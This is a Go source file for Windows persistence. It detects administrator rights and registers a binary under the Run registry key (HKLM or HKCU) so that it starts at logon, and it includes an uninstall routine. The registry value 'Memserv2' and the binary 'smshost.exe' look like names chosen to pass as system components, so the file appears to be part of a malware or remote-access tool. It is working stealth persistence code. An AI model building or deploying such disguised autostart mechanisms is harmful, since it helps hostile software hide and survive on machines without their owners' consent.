package persistence

import (
	"io"
	"log"
	"os"
	"path"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

const (
	runKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
)

func runningAsAdmin() bool {
	var sid *windows.SID
	err := windows.AllocateAndInitializeSid(
		&windows.SECURITY_NT_AUTHORITY,
		2,
		windows.SECURITY_BUILTIN_DOMAIN_RID,
		windows.DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&sid,
	)
	log.Println(err)
	token := windows.Token(0)
	member, err := token.IsMember(sid)
	log.Println(err)

	return member
}

func TryRegistryInstall() error {
	var root registry.Key
	if runningAsAdmin() {
		root = registry.LOCAL_MACHINE
	} else {
		root = registry.CURRENT_USER
	}
	run, err := registry.OpenKey(root, runKey, registry.ALL_ACCESS)
	if err != nil {
		return err
	}
	defer run.Close()
	return run.SetStringValue(_registry, path.Join(Info.Base, Binary))
}
func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, in)
	return err
}

// UninstallRegistry removes Run entries created by a registry install.
// Call with nil for a full uninstall.
func UninstallRegistry(root interface{}) error {
	if root == nil {
		if runningAsAdmin() {
			err := UninstallRegistry(registry.LOCAL_MACHINE)
			if err != nil {
				return err
			}
		}
		root = registry.CURRENT_USER
	}

	run, err := registry.OpenKey(root.(registry.Key), runKey, registry.ALL_ACCESS)
	if err != nil {
		return err
	}

	err = run.DeleteValue(_registry)
	if os.IsNotExist(err) {
		return nil
	}
	return err
}

var (
	_registry string = "Memserv2"
	Binary           = "smshost.exe"
)
